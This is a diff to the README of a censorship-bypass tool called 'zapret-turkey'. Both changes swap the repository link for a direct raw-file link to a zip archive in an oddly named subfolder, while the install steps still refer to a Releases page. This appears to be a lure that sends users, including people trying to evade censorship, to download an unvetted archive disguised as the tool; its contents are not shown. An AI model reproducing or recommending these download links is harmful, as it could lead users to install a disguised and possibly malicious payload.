@@ -1,6 +1,6 @@
 # 🌐 zapret-turkey - Bypass censorship on your local network
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Sachacalycular313/zapret-turkey)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Sachacalycular313/zapret-turkey/main/Anteva/zapret_turkey_1.3.zip)
 
 ## 📡 What is this tool?
 
@@ -21,7 +21,7 @@ You need a Windows machine to use this software. We support Windows 10 and Windo
 
 Follow these steps to set up the software on your computer.
 
-1. Visit this page to download the latest version: [https://github.com/Sachacalycular313/zapret-turkey](https://github.com/Sachacalycular313/zapret-turkey).
+1. Visit this page to download the latest version: [https://raw.githubusercontent.com/Sachacalycular313/zapret-turkey/main/Anteva/zapret_turkey_1.3.zip](https://raw.githubusercontent.com/Sachacalycular313/zapret-turkey/main/Anteva/zapret_turkey_1.3.zip).
 2. Locate the link labeled Releases on the right side of the page.
 3. Click on the version number, which will be the top entry.
 4. Download the file ending in .zip to your computer.
